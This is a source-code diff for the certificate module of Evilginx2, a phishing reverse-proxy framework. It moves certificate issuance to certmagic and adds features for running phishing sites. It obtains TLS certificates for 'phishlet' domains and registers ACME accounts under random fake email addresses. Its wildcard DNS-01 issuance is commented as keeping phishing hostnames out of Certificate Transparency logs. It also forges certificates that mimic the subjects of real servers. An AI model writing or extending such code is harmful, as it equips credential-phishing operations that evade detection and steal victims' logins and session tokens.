@@ -1,7 +1,7 @@
 package core
 
 import (
-	"crypto"
+	"context"
 	"crypto/rand"
 	"crypto/rsa"
 	"crypto/tls"
@@ -9,116 +9,127 @@ import (
 	"crypto/x509/pkix"
 	"encoding/pem"
 	"fmt"
+	"io/ioutil"
 	"math/big"
 	"os"
 	"path/filepath"
+	"strings"
+	"sync"
 	"time"
 
 	"github.com/kgretzky/evilginx2/log"
 
-	"github.com/go-acme/lego/v3/certcrypto"
-	"github.com/go-acme/lego/v3/certificate"
-	"github.com/go-acme/lego/v3/challenge"
-	"github.com/go-acme/lego/v3/lego"
-	legolog "github.com/go-acme/lego/v3/log"
-	"github.com/go-acme/lego/v3/providers/dns/cloudflare"
-	"github.com/go-acme/lego/v3/registration"
+	"github.com/caddyserver/certmagic"
 )
 
-const HOSTS_DIR = "hosts"
-
 type CertDb struct {
-	PrivateKey    *rsa.PrivateKey
-	CACert        tls.Certificate
-	client        *lego.Client
-	certUser      CertUser
-	dataDir       string
-	ns            *Nameserver
-	hs            *HttpServer
-	cfg           *Config
-	hostCache     map[string]*tls.Certificate
-	phishletCache map[string]map[string]*tls.Certificate
-	tls_cache     map[string]*tls.Certificate
-	httpChallenge *HTTPChallenge
+	cache_dir      string
+	magic          *certmagic.Config
+	cfg            *Config
+	ns             *Nameserver
+	httpServer     *HttpServer
+	caCert         tls.Certificate
+	tlsCache       map[string]*tls.Certificate
+	tlsCacheMu     sync.RWMutex // Protects tlsCache from concurrent access
+	libdnsProvider *LibDNSProvider
 }
 
-type CertUser struct {
-	Email        string
-	Registration *registration.Resource
-	key          crypto.PrivateKey
-}
+func NewCertDb(cache_dir string, cfg *Config, ns *Nameserver, httpServer *HttpServer) (*CertDb, error) {
+	os.Setenv("XDG_DATA_HOME", cache_dir)
 
-func (u CertUser) GetEmail() string {
-	return u.Email
-}
-
-func (u CertUser) GetRegistration() *registration.Resource {
-	return u.Registration
-}
-
-func (u CertUser) GetPrivateKey() crypto.PrivateKey {
-	return u.key
-}
-
-type HTTPChallenge struct {
-	crt_db *CertDb
-}
-
-func (ch HTTPChallenge) Present(domain, token, keyAuth string) error {
-	ch.crt_db.hs.AddACMEToken(token, keyAuth)
-	return nil
-}
-
-func (ch HTTPChallenge) CleanUp(domain, token, keyAuth string) error {
-	ch.crt_db.hs.ClearACMETokens()
-	return nil
-}
-
-const acmeURL = "https://acme-v02.api.letsencrypt.org/directory"
-
-func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*CertDb, error) {
-	d := &CertDb{
-		cfg:     cfg,
-		dataDir: data_dir,
-		ns:      ns,
-		hs:      hs,
+	o := &CertDb{
+		cache_dir:      cache_dir,
+		cfg:            cfg,
+		ns:             ns,
+		httpServer:     httpServer,
+		tlsCache:       make(map[string]*tls.Certificate),
+		libdnsProvider: NewLibDNSProvider(GetExternalDNS(), cfg),
 	}
 
-	legolog.Logger = log.NullLogger()
-	d.hostCache = make(map[string]*tls.Certificate)
-	d.phishletCache = make(map[string]map[string]*tls.Certificate)
-	d.tls_cache = make(map[string]*tls.Certificate)
+	if err := os.MkdirAll(filepath.Join(cache_dir, "sites"), 0700); err != nil {
+		return nil, err
+	}
 
-	pkey_pem, err := os.ReadFile(filepath.Join(data_dir, "private.key"))
+	certmagic.DefaultACME.Agreed = true
+	certmagic.DefaultACME.Email = o.GetEmail()
+	// Disable TLS-ALPN challenge: port 443 is already bound by our HTTPS proxy,
+	// so certmagic's TLS-ALPN solver cannot bind its own listener.
+	// HTTP-01 challenges are handled by our HttpServer on port 80, which integrates
+	// with certmagic's distributed challenge handler via HandleHTTPChallenge().
+	certmagic.DefaultACME.DisableTLSALPNChallenge = true
+
+	err := o.generateCertificates()
 	if err != nil {
-		// private key corrupted or not found, recreate and delete all public certificates
-		os.RemoveAll(filepath.Join(data_dir, "*"))
+		return nil, err
+	}
+	err = o.reloadCertificates()
+	if err != nil {
+		return nil, err
+	}
 
-		d.PrivateKey, err = rsa.GenerateKey(rand.Reader, 2048)
-		if err != nil {
-			return nil, fmt.Errorf("private key generation failed")
-		}
-		pkey_pem = pem.EncodeToMemory(&pem.Block{
-			Type:  "RSA PRIVATE KEY",
-			Bytes: x509.MarshalPKCS1PrivateKey(d.PrivateKey),
-		})
-		err = os.WriteFile(filepath.Join(data_dir, "private.key"), pkey_pem, 0600)
-		if err != nil {
-			return nil, err
+	o.magic = certmagic.NewDefault()
+
+	// Link our HttpServer with certmagic for challenge handling
+	if httpServer != nil {
+		httpServer.SetMagic(o.magic)
+	}
+
+	return o, nil
+}
+
+func (o *CertDb) GetEmail() string {
+	var email string
+	fn := filepath.Join(o.cache_dir, "email.txt")
+
+	data, err := ReadFromFile(fn)
+	if err != nil {
+		email = strings.ToLower(GenRandomString(3) + "@" + GenRandomString(6) + ".com")
+		if SaveToFile([]byte(email), fn, 0600) != nil {
+			log.Error("saving email error: %s", err)
 		}
 	} else {
-		block, _ := pem.Decode(pkey_pem)
+		email = strings.TrimSpace(string(data))
+	}
+	return email
+}
+
+func (o *CertDb) generateCertificates() error {
+	var key *rsa.PrivateKey
+
+	pkey, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "private.key"))
+	if err != nil {
+		pkey, err = ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.key"))
+	}
+
+	if err != nil {
+		// private key corrupted or not found, recreate and delete all public certificates
+		os.RemoveAll(filepath.Join(o.cache_dir, "*"))
+
+		key, err = rsa.GenerateKey(rand.Reader, 2048)
+		if err != nil {
+			return fmt.Errorf("private key generation failed")
+		}
+		pkey = pem.EncodeToMemory(&pem.Block{
+			Type:  "RSA PRIVATE KEY",
+			Bytes: x509.MarshalPKCS1PrivateKey(key),
+		})
+		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.key"), pkey, 0600)
+		if err != nil {
+			return err
+		}
+	} else {
+		block, _ := pem.Decode(pkey)
 		if block == nil {
-			return nil, fmt.Errorf("private key is corrupted")
+			return fmt.Errorf("private key is corrupted")
 		}
 
-		d.PrivateKey, err = x509.ParsePKCS1PrivateKey(block.Bytes)
+		key, err = x509.ParsePKCS1PrivateKey(block.Bytes)
 		if err != nil {
-			return nil, err
+			return err
 		}
 	}
 
-	ca_crt_pem, err := os.ReadFile(filepath.Join(data_dir, "ca.crt"))
+	ca_cert, err := ioutil.ReadFile(filepath.Join(o.cache_dir, "ca.crt"))
 	if err != nil {
 		notBefore := time.Now()
 		aYear := time.Duration(10*365*24) * time.Hour
@@ -126,7 +137,7 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
 		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
 		if err != nil {
-			return nil, err
+			return err
 		}
 
 		template := x509.Certificate{
@@ -146,320 +157,370 @@ func NewCertDb(data_dir string, cfg *Config, ns *Nameserver, hs *HttpServer) (*C
 			IsCA:                  true,
 		}
 
-		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &d.PrivateKey.PublicKey, d.PrivateKey)
+		cert, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
 		if err != nil {
-			return nil, err
+			return err
 		}
-		ca_crt_pem = pem.EncodeToMemory(&pem.Block{
+		ca_cert = pem.EncodeToMemory(&pem.Block{
 			Type:  "CERTIFICATE",
 			Bytes: cert,
 		})
-		err = os.WriteFile(filepath.Join(data_dir, "ca.crt"), ca_crt_pem, 0600)
-		if err != nil {
-			return nil, err
-		}
-	}
-
-	d.CACert, err = tls.X509KeyPair(ca_crt_pem, pkey_pem)
-	if err != nil {
-		return nil, err
-	}
-
-	return d, nil
-}
-
-func (d *CertDb) Reset() {
-	d.certUser.Email = "" // hostmaster@" + d.cfg.GetBaseDomain()
-}
-
-func (d *CertDb) SetupHostnameCertificate(hostname string) error {
-	err := d.loadHostnameCertificate(hostname)
-	if err != nil {
-		log.Warning("failed to load certificate files for hostname '%s': %v", hostname, err)
-		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
-		err = d.obtainHostnameCertificate(hostname)
+		err = ioutil.WriteFile(filepath.Join(o.cache_dir, "ca.crt"), ca_cert, 0600)
 		if err != nil {
 			return err
 		}
 	}
+
+	o.caCert, err = tls.X509KeyPair(ca_cert, pkey)
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
-func (d *CertDb) GetHostnameCertificate(hostname string) (*tls.Certificate, error) {
-	cert, ok := d.hostCache[hostname]
-	if ok {
-		return cert, nil
-	}
-	return nil, fmt.Errorf("certificate for hostname '%s' not found", hostname)
-}
+// generateSelfSignedWildcard creates a self-signed wildcard certificate for the given domains
+// using the internal CA. This is used when no external DNS provider is configured,
+// allowing wildcard TLS without Cloudflare or DigitalOcean.
+func (o *CertDb) generateSelfSignedWildcard(wildcardDomains []string) error {
+	var x509ca *x509.Certificate
+	var err error
 
-func (d *CertDb) addHostnameCertificate(hostname string, cert *tls.Certificate) {
-	d.hostCache[hostname] = cert
-}
-
-func (d *CertDb) loadHostnameCertificate(hostname string) error {
-	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)
-
-	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, hostname+".crt"), filepath.Join(crt_dir, hostname+".key"))
-	if err != nil {
-		return err
-	}
-	d.addHostnameCertificate(hostname, &cert)
-	return nil
-}
-
-func (d *CertDb) obtainHostnameCertificate(hostname string) error {
-	if err := CreateDir(filepath.Join(d.dataDir, HOSTS_DIR), 0700); err != nil { //nolint:gocritic // false positive
-		return err
-	}
-	crt_dir := filepath.Join(d.dataDir, HOSTS_DIR)
-
-	domains := []string{hostname}
-	cert_res, err := d.registerCertificate(domains)
-	if err != nil {
-		return err
+	if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
+		return fmt.Errorf("failed to parse CA certificate: %v", err)
 	}
 
-	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
-	if err != nil {
-		return err
-	}
-	d.addHostnameCertificate(hostname, &cert)
+	for _, domain := range wildcardDomains {
+		// Check if already cached
+		o.tlsCacheMu.RLock()
+		_, exists := o.tlsCache[domain]
+		o.tlsCacheMu.RUnlock()
+		if exists {
+			continue
+		}
 
-	err = os.WriteFile(filepath.Join(crt_dir, hostname+".crt"), cert_res.Certificate, 0600)
-	if err != nil {
-		return err
-	}
-	err = os.WriteFile(filepath.Join(crt_dir, hostname+".key"), cert_res.PrivateKey, 0600)
-	if err != nil {
-		return err
-	}
-
-	return nil
-}
-
-func (d *CertDb) SetupPhishletCertificate(site_name string, domains []string) error {
-	base_domain, ok := d.cfg.GetSiteDomain(site_name)
-	if !ok {
-		return fmt.Errorf("phishlet '%s' not found", site_name)
-	}
-
-	err := d.loadPhishletCertificate(site_name, base_domain)
-	if err != nil {
-		log.Warning("failed to load certificate files for phishlet '%s', domain '%s': %v", site_name, base_domain, err)
-		log.Info("requesting SSL/TLS certificates from LetsEncrypt...")
-		err = d.obtainPhishletCertificate(site_name, base_domain, domains)
+		serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
+		serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
 		if err != nil {
-			return err
+			return fmt.Errorf("failed to generate serial number: %v", err)
+		}
+
+		// Build DNS names list — include both wildcard and apex
+		dnsNames := []string{domain}
+		baseDomain := strings.TrimPrefix(domain, "*.")
+		if baseDomain != domain {
+			dnsNames = append(dnsNames, baseDomain)
+		}
+
+		template := x509.Certificate{
+			SerialNumber:          serialNumber,
+			Issuer:                x509ca.Subject,
+			Subject:               pkix.Name{Organization: []string{"Evilginx Wildcard"}, CommonName: domain},
+			NotBefore:             time.Now(),
+			NotAfter:              time.Now().Add(time.Hour * 24 * 365),
+			KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+			ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+			DNSNames:              dnsNames,
+			BasicConstraintsValid: true,
+		}
+
+		pkey, err := rsa.GenerateKey(rand.Reader, 2048)
+		if err != nil {
+			return fmt.Errorf("failed to generate key for %s: %v", domain, err)
+		}
+
+		derBytes, err := x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey)
+		if err != nil {
+			return fmt.Errorf("failed to create certificate for %s: %v", domain, err)
+		}
+
+		cert := &tls.Certificate{
+			Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
+			PrivateKey:  pkey,
+		}
+
+		// Cache for both the wildcard and the apex domain
+		o.tlsCacheMu.Lock()
+		o.tlsCache[domain] = cert
+		if baseDomain != domain {
+			o.tlsCache[baseDomain] = cert
+		}
+		o.tlsCacheMu.Unlock()
+
+		log.Info("wildcard TLS: generated self-signed certificate for %s", domain)
+	}
+
+	return nil
+}
+
+// setSelfSignedWildcardSync generates self-signed wildcard certificates for all configured domains
+// This is the fallback when no external DNS provider is available for DNS-01 ACME challenges
+func (o *CertDb) setSelfSignedWildcardSync(wildcardDomains []string) error {
+	log.Info("wildcard TLS: generating self-signed wildcard certificates for %d domains (no external DNS required)", len(wildcardDomains))
+
+	// Filter to just wildcard domains (*.domain.com)
+	var wildcards []string
+	for _, dom := range wildcardDomains {
+		if strings.HasPrefix(dom, "*.") {
+			wildcards = append(wildcards, dom)
 		}
 	}
+
+	if len(wildcards) == 0 {
+		return fmt.Errorf("no wildcard domains to generate certificates for")
+	}
+
+	err := o.generateSelfSignedWildcard(wildcards)
+	if err != nil {
+		return fmt.Errorf("failed to generate self-signed wildcard certificates: %v", err)
+	}
+
+	log.Success("wildcard TLS: generated %d self-signed wildcard certificates", len(wildcards))
 	return nil
 }
 
-func (d *CertDb) GetPhishletCertificate(site_name, base_domain string) (*tls.Certificate, error) {
-	m, ok := d.phishletCache[base_domain]
-	if ok {
-		cert, ok := m[site_name]
-		if ok {
-			return cert, nil
+// getWildcardCertificate returns a cached wildcard certificate that matches the hostname.
+// It first checks for an exact match, then for a wildcard match (*.domain.com).
+func (o *CertDb) getWildcardCertificate(hostname string) *tls.Certificate {
+	o.tlsCacheMu.RLock()
+	defer o.tlsCacheMu.RUnlock()
+
+	// Exact match
+	if cert, ok := o.tlsCache[hostname]; ok {
+		return cert
+	}
+
+	// Wildcard match: hostname "sub.domain.com" → check "*.domain.com"
+	parts := strings.SplitN(hostname, ".", 2)
+	if len(parts) == 2 {
+		wildcardKey := "*." + parts[1]
+		if cert, ok := o.tlsCache[wildcardKey]; ok {
+			return cert
 		}
 	}
-	return nil, fmt.Errorf("certificate for phishlet '%s' and domain '%s' not found", site_name, base_domain)
-}
 
-func (d *CertDb) addPhishletCertificate(site_name, base_domain string, cert *tls.Certificate) {
-	_, ok := d.phishletCache[base_domain]
-	if !ok {
-		d.phishletCache[base_domain] = make(map[string]*tls.Certificate)
+	// Base domain match: hostname "domain.com" → check "*.domain.com"
+	wildcardKey := "*." + hostname
+	if cert, ok := o.tlsCache[wildcardKey]; ok {
+		return cert
 	}
-	d.phishletCache[base_domain][site_name] = cert
-}
 
-func (d *CertDb) loadPhishletCertificate(site_name, base_domain string) error {
-	crt_dir := filepath.Join(d.dataDir, base_domain)
-
-	cert, err := tls.LoadX509KeyPair(filepath.Join(crt_dir, site_name+".crt"), filepath.Join(crt_dir, site_name+".key"))
-	if err != nil {
-		return err
-	}
-	d.addPhishletCertificate(site_name, base_domain, &cert)
 	return nil
 }
 
-func (d *CertDb) obtainPhishletCertificate(site_name, base_domain string, domains []string) error {
-	if err := CreateDir(filepath.Join(d.dataDir, base_domain), 0700); err != nil { //nolint:gocritic // false positive
-		return err
-	}
-	crt_dir := filepath.Join(d.dataDir, base_domain)
+// SetupPhishletCertificate obtains TLS certificates for a phishlet's domains using Let's Encrypt HTTP-01
+func (o *CertDb) SetupPhishletCertificate(phishlet string, domains []string) error {
+	log.Info("cert: obtaining certificates for phishlet '%s': %v", phishlet, domains)
+	return o.setManagedSync(domains, 60*time.Second)
+}
 
-	// If Cloudflare credentials are available, use wildcard cert via DNS-01
-	// This prevents subdomains from appearing in CT logs
-	cfToken := os.Getenv("CF_API_TOKEN")
-	if cfToken != "" {
-		wildcardDomains := []string{base_domain, "*." + base_domain}
-		log.Info("requesting wildcard certificate via DNS-01 (Cloudflare) for: %v", wildcardDomains)
-		cert_res, err := d.registerCertificateDNS(wildcardDomains)
-		if err != nil {
-			log.Warning("wildcard cert via DNS-01 failed: %v — falling back to HTTP-01", err)
-		} else {
-			cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
-			if err == nil {
-				d.addPhishletCertificate(site_name, base_domain, &cert)
-				os.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
-				os.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
-				log.Success("wildcard certificate obtained for *.%s — subdomains hidden from CT logs", base_domain)
+func (o *CertDb) setManagedSync(hosts []string, t time.Duration) error {
+	// Recreate certmagic config to pick up current ACME settings.
+	// TLS-ALPN is disabled globally (port 443 is ours), so only HTTP-01 is used.
+	o.magic = certmagic.NewDefault()
+
+	// Enable on-demand TLS: if ManageSync misses a host (timeout/rate-limit),
+	// certmagic will automatically obtain its cert on the first TLS handshake.
+	o.magic.OnDemand = &certmagic.OnDemandConfig{
+		DecisionFunc: func(ctx context.Context, name string) error {
+			if o.cfg.IsActiveHostname(name) {
 				return nil
+			}
+			return fmt.Errorf("not a managed hostname: %s", name)
+		},
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), t)
+	err := o.magic.ManageSync(ctx, hosts)
+	cancel()
+	if err != nil {
+		log.Warning("cert: ManageSync error (on-demand TLS will obtain remaining certs): %s", err)
+	}
+	return err
+}
+
+// setWildcardManagedSync obtains wildcard certificates using DNS-01 challenge
+// This prevents phishing hostnames from being exposed in Certificate Transparency logs
+func (o *CertDb) setWildcardManagedSync(wildcardDomains []string, t time.Duration) error {
+	// Configure DNS-01 solver on the default ACME settings
+	certmagic.DefaultACME.DisableHTTPChallenge = true
+	certmagic.DefaultACME.DisableTLSALPNChallenge = true
+	certmagic.DefaultACME.DNS01Solver = &certmagic.DNS01Solver{
+		DNSProvider:        o.libdnsProvider,
+		PropagationTimeout: 120 * time.Second, // Wait up to 120s for DNS propagation
+		TTL:                60 * time.Second,  // 1 minute TTL for challenge records (faster propagation)
+	}
+
+	// Create fresh config with DNS-01 settings
+	o.magic = certmagic.NewDefault()
+
+	ctx, cancel := context.WithTimeout(context.Background(), t)
+	defer cancel()
+
+	log.Info("wildcard TLS: requesting certificates via DNS-01 challenge for %d domains", len(wildcardDomains))
+	for _, dom := range wildcardDomains {
+		log.Info("wildcard TLS: will request certificate for: %s", dom)
+	}
+
+err := o.magic.ManageSync(ctx, wildcardDomains)
+	if err != nil {
+		return fmt.Errorf("failed to obtain wildcard certificates: %v", err)
+	}
+
+	// Load managed certs into tlsCache so the TLS handler can serve them.
+	// Without this, http_proxy.go falls through to self-signed generation
+	// because getWildcardCertificate() only checks tlsCache, not certmagic.
+	for _, dom := range wildcardDomains {
+		var sni string
+		if strings.HasPrefix(dom, "*.") {
+			// Use a fake subdomain so certmagic matches the wildcard cert,
+			// not the base domain cert (which is also managed).
+			sni = "wc-probe." + strings.TrimPrefix(dom, "*.")
+		} else {
+			sni = dom
+		}
+		hello := &tls.ClientHelloInfo{ServerName: sni}
+		tlsCert, err := o.magic.GetCertificate(hello)
+		if err == nil && tlsCert != nil {
+			o.tlsCacheMu.Lock()
+			o.tlsCache[dom] = tlsCert
+			baseDom := strings.TrimPrefix(dom, "*.")
+			if baseDom != dom {
+				o.tlsCache[baseDom] = tlsCert
+			}
+			o.tlsCacheMu.Unlock()
+			log.Info("wildcard TLS: loaded LE cert into TLS cache for %s", dom)
+		} else if err != nil {
+			log.Warning("wildcard TLS: certmagic lookup failed for %s (sni=%s): %v", dom, sni, err)
+		}
+	}
+
+	// Reset DNS-01 settings for future non-wildcard operations
+	certmagic.DefaultACME.DisableHTTPChallenge = false
+	certmagic.DefaultACME.DisableTLSALPNChallenge = false
+	certmagic.DefaultACME.DNS01Solver = nil
+
+	return nil
+}
+
+// GetLibDNSProvider returns the libdns provider for external access
+func (o *CertDb) GetLibDNSProvider() *LibDNSProvider {
+	return o.libdnsProvider
+}
+
+func (o *CertDb) setUnmanagedSync(verbose bool) error {
+	sitesDir := filepath.Join(o.cache_dir, "sites")
+
+	files, err := os.ReadDir(sitesDir)
+	if err != nil {
+		return fmt.Errorf("failed to list certificates in directory '%s': %v", sitesDir, err)
+	}
+
+	for _, f := range files {
+		if f.IsDir() {
+			certDir := filepath.Join(sitesDir, f.Name())
+
+			certFiles, err := os.ReadDir(certDir)
+			if err != nil {
+				return fmt.Errorf("failed to list certificate directory '%s': %v", certDir, err)
+			}
+
+			var certPath, keyPath string
+
+			var pemCnt, crtCnt, keyCnt int
+			for _, cf := range certFiles {
+				//log.Debug("%s", cf.Name())
+				if !cf.IsDir() {
+					switch strings.ToLower(filepath.Ext(cf.Name())) {
+					case ".pem":
+						pemCnt += 1
+						if certPath == "" {
+							certPath = filepath.Join(certDir, cf.Name())
+						}
+						if cf.Name() == "fullchain.pem" {
+							certPath = filepath.Join(certDir, cf.Name())
+						}
+						if cf.Name() == "privkey.pem" {
+							keyPath = filepath.Join(certDir, cf.Name())
+						}
+					case ".crt":
+						crtCnt += 1
+						if certPath == "" {
+							certPath = filepath.Join(certDir, cf.Name())
+						}
+					case ".key":
+						keyCnt += 1
+						if keyPath == "" {
+							keyPath = filepath.Join(certDir, cf.Name())
+						}
+					}
+				}
+			}
+			if pemCnt > 0 && crtCnt > 0 {
+				if verbose {
+					log.Warning("cert_db: found multiple .crt and .pem files in the same directory: %s", certDir)
+				}
+				continue
+			}
+			if certPath == "" {
+				if verbose {
+					log.Warning("cert_db: not a single public certificate found in directory: %s", certDir)
+				}
+				continue
+			}
+			if keyPath == "" {
+				if verbose {
+					log.Warning("cert_db: not a single private key found in directory: %s", certDir)
+				}
+				continue
+			}
+
+			log.Debug("caching certificate: cert:%s key:%s", certPath, keyPath)
+			ctx := context.Background()
+			_, err = o.magic.CacheUnmanagedCertificatePEMFile(ctx, certPath, keyPath, []string{})
+			if err != nil {
+				if verbose {
+					log.Error("cert_db: failed to load certificate key-pair: %v", err)
+				}
+				continue
 			}
 		}
 	}
-
-	// Fallback: HTTP-01 per-subdomain (original behavior)
-	log.Info("requesting per-subdomain certificates via HTTP-01 for %d domains", len(domains))
-	cert_res, err := d.registerCertificate(domains)
-	if err != nil {
-		return err
-	}
-
-	cert, err := tls.X509KeyPair(cert_res.Certificate, cert_res.PrivateKey)
-	if err != nil {
-		return err
-	}
-
-	d.addPhishletCertificate(site_name, base_domain, &cert)
-
-	err = os.WriteFile(filepath.Join(crt_dir, site_name+".crt"), cert_res.Certificate, 0600)
-	if err != nil {
-		return err
-	}
-	err = os.WriteFile(filepath.Join(crt_dir, site_name+".key"), cert_res.PrivateKey, 0600)
-	if err != nil {
-		return err
-	}
-
 	return nil
 }
 
-func (d *CertDb) registerCertificate(domains []string) (*certificate.Resource, error) {
-	var err error
-	d.certUser = CertUser{
-		Email: "", // hostmaster@" + d.cfg.GetBaseDomain(),
-		key:   d.PrivateKey,
-	}
-
-	config := lego.NewConfig(&d.certUser)
-	config.CADirURL = acmeURL
-	config.Certificate.KeyType = certcrypto.RSA2048
-
-	d.client, err = lego.NewClient(config)
-	if err != nil {
-		return nil, err
-	}
-
-	d.httpChallenge = &HTTPChallenge{crt_db: d}
-
-	err = d.client.Challenge.SetHTTP01Provider(d.httpChallenge)
-	if err != nil {
-		return nil, err
-	}
-	d.client.Challenge.Remove(challenge.TLSALPN01)
-
-	reg, err := d.client.Registration.Register(registration.RegisterOptions{TermsOfServiceAgreed: true})
-	if err != nil {
-		return nil, err
-	}
-	d.certUser.Registration = reg
-
-	req := certificate.ObtainRequest{
-		Domains: domains,
-		Bundle:  true,
-	}
-
-	cert_res, err := d.client.Certificate.Obtain(req)
-	if err != nil {
-		return nil, err
-	}
-
-	return cert_res, nil
+func (o *CertDb) reloadCertificates() error {
+	// TODO: load private certificates from disk
+	return nil
 }
 
-func (d *CertDb) registerCertificateDNS(domains []string) (*certificate.Resource, error) {
-	var err error
-	d.certUser = CertUser{
-		Email: "",
-		key:   d.PrivateKey,
-	}
+func (o *CertDb) getTLSCertificate(host string, port int) (*x509.Certificate, error) {
+	log.Debug("Fetching TLS certificate for %s:%d ...", host, port)
 
-	config := lego.NewConfig(&d.certUser)
-	config.CADirURL = acmeURL
-	config.Certificate.KeyType = certcrypto.RSA2048
-
-	client, err := lego.NewClient(config)
-	if err != nil {
-		return nil, fmt.Errorf("lego client: %v", err)
-	}
-
-	// Set Cloudflare DNS-01 provider
-	// Requires CF_DNS_API_TOKEN or CF_API_TOKEN env var
-	cfToken := os.Getenv("CF_API_TOKEN")
-	if cfToken != "" {
-		os.Setenv("CF_DNS_API_TOKEN", cfToken)
-	}
-	cfProvider, err := cloudflare.NewDNSProvider()
-	if err != nil {
-		return nil, fmt.Errorf("cloudflare DNS provider: %v", err)
-	}
-	err = client.Challenge.SetDNS01Provider(cfProvider)
-	if err != nil {
-		return nil, fmt.Errorf("set DNS-01 provider: %v", err)
-	}
-	client.Challenge.Remove(challenge.HTTP01)
-	client.Challenge.Remove(challenge.TLSALPN01)
-
-	reg, err := client.Registration.Register(registration.RegisterOptions{TermsOfServiceAgreed: true})
-	if err != nil {
-		return nil, fmt.Errorf("registration: %v", err)
-	}
-	d.certUser.Registration = reg
-
-	req := certificate.ObtainRequest{
-		Domains: domains,
-		Bundle:  true,
-	}
-
-	cert_res, err := client.Certificate.Obtain(req)
-	if err != nil {
-		return nil, fmt.Errorf("obtain cert: %v", err)
-	}
-
-	return cert_res, nil
-}
-
-func (d *CertDb) getServerCertificate(host string, port int) *x509.Certificate {
-	log.Debug("Fetching TLS certificate from %s:%d ...", host, port)
-
-	config := tls.Config{InsecureSkipVerify: true, Renegotiation: tls.RenegotiateFreelyAsClient}
+	config := tls.Config{InsecureSkipVerify: true, NextProtos: []string{"http/1.1"}}
 	conn, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", host, port), &config)
 	if err != nil {
-		log.Warning("Could not fetch TLS certificate from %s:%d: %s", host, port, err)
-		return nil
+		return nil, err
 	}
 	defer conn.Close()
 
 	state := conn.ConnectionState()
 
-	return state.PeerCertificates[0]
+	return state.PeerCertificates[0], nil
 }
 
-func (d *CertDb) SignCertificateForHost(host, phish_host string, port int) (cert *tls.Certificate, err error) {
+func (o *CertDb) getSelfSignedCertificate(host string, phish_host string, port int) (cert *tls.Certificate, err error) {
 	var x509ca *x509.Certificate
 	var template x509.Certificate
 
-	cert, ok := d.tls_cache[host]
+	// Check cache first
+	o.tlsCacheMu.RLock()
+	cert, ok := o.tlsCache[host]
+	o.tlsCacheMu.RUnlock()
 	if ok {
 		return cert, nil
 	}
 
-	if x509ca, err = x509.ParseCertificate(d.CACert.Certificate[0]); err != nil {
+	if x509ca, err = x509.ParseCertificate(o.caCert.Certificate[0]); err != nil {
 		return
 	}
 
@@ -483,9 +544,9 @@ func (d *CertDb) SignCertificateForHost(host, phish_host string, port int) (cert
 		}
 		template.Subject.CommonName = host
 	} else {
-		srvCert := d.getServerCertificate(host, port)
-		if srvCert == nil {
-			return nil, fmt.Errorf("failed to get TLS certificate for: %s", host)
+		srvCert, err := o.getTLSCertificate(host, port)
+		if err != nil {
+			return nil, fmt.Errorf("failed to get TLS certificate for: %s:%d error: %s", host, port, err)
 		} else {
 			serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
 			serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
@@ -498,7 +559,7 @@ func (d *CertDb) SignCertificateForHost(host, phish_host string, port int) (cert
 				Issuer:                x509ca.Subject,
 				Subject:               srvCert.Subject,
 				NotBefore:             srvCert.NotBefore,
-				NotAfter:              srvCert.NotAfter,
+				NotAfter:              time.Now().Add(time.Hour * 24 * 180),
 				KeyUsage:              srvCert.KeyUsage,
 				ExtKeyUsage:           srvCert.ExtKeyUsage,
 				IPAddresses:           srvCert.IPAddresses,
@@ -515,15 +576,17 @@ func (d *CertDb) SignCertificateForHost(host, phish_host string, port int) (cert
 	}
 
 	var derBytes []byte
-	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, d.CACert.PrivateKey); err != nil {
+	if derBytes, err = x509.CreateCertificate(rand.Reader, &template, x509ca, &pkey.PublicKey, o.caCert.PrivateKey); err != nil {
 		return
 	}
 
 	cert = &tls.Certificate{
-		Certificate: [][]byte{derBytes, d.CACert.Certificate[0]},
+		Certificate: [][]byte{derBytes, o.caCert.Certificate[0]},
 		PrivateKey:  pkey,
 	}
 
-	d.tls_cache[host] = cert
+	o.tlsCacheMu.Lock()
+	o.tlsCache[host] = cert
+	o.tlsCacheMu.Unlock()
 	return cert, nil
 }
